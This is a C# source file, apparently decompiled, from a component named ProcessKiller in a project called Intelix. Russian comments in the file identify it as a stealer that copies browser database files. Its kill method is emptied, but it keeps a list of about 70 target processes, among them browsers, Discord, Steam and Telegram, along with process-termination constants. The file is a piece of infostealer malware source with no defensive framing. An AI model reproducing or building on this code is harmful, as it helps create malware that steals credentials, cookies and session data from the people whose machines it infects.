using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;

namespace Intelix.Helper
{
	// Token: 0x02000061 RID: 97
	public static class ProcessKiller
	{
		// Token: 0x06000161 RID: 353 RVA: 0x00011698 File Offset: 0x0000F898
		// ОТКЛЮЧЕНО: не убиваем процессы, работаем с открытыми браузерами через копирование файлов
		public static void KillerAll()
		{
			// Метод намеренно пустой - не закрываем приложения
			// Stealer работает с копиями файлов БД, не требуя закрытия браузеров
		}

		// Token: 0x04000030 RID: 48
		public static string[] Targets = new string[]
		{
			"firefox.exe",
			"waterfox.exe",
			"k-meleon.exe",
			"thunderbird.exe",
			"icedragon.exe",
			"cyberfox.exe",
			"blackhawk.exe",
			"palemoon.exe",
			"ghostery.exe",
			"undetectable.exe",
			"sielo.exe",
			"conkeror.exe",
			"msedge.exe",
			"netscape.exe",
			"seamonkey.exe",
			"slimbrowser.exe",
			"msedge_pwa_launcher.exe",
			"avant.exe",
			"opera.exe",
			"operagx.exe",
			"msedgewebview2.exe",
			"msedgewebview.exe",
			"chromium.exe",
			"slimjet.exe",
			"chrome.exe",
			"browser.exe",
			"vivaldi.exe",
			"brave.exe",
			"edge.exe",
			"microsoft.exe",
			"dragon.exe",
			"torch.exe",
			"mozila.exe",
			"discord.exe",
			"update.exe",
			"yandex.exe",
			"sputnik.exe",
			"nichrome.exe",
			"msedge_proxy.exe",
			"cocbrowser.exe",
			"uran.exe",
			"msedge_proxy.exe",
			"chromodo.exe",
			"atom.exe",
			"bravebrowser.exe",
			"steam.exe",
			"cryptotab.exe",
			"ghostbrowser.exe",
			"maelstrom.exe",
			"kinza.exe",
			"globus.exe",
			"falkon.exe",
			"elementbrowser.exe",
			"colibri.exe",
			"whale.exe",
			"avastbrowser.exe",
			"ucbrowser.exe",
			"maxthon.exe",
			"blisk.exe",
			"aolshield.exe",
			"baidubrowser.exe",
			"ccleanerbrowser.exe",
			"hola.exe",
			"xvast.exe",
			"kingpin.exe",
			"qqbrowser.exe",
			"private_browsing.exe",
			"chrome_pwa_launcher.exe",
			"chrome_proxy.exe",
			"telegram.exe"
		};

		// Token: 0x04000031 RID: 49
		private const uint PROCESS_QUERY_LIMITED_INFORMATION = 4096U;

		// Token: 0x04000032 RID: 50
		private const uint PROCESS_TERMINATE = 1U;
	}
}
